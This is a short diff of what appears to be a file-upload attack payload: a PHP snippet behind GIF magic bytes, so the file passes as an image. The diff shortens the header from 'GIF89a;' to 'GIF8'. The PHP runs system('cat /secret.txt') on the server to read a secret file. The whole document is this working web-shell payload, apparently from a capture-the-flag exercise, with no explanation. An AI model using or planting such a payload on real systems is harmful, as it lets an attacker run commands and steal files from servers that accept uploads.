@@ -1,4 +1,4 @@
-GIF89a;
+GIF8
 <?php 
 system('cat /secret.txt');
 ?>
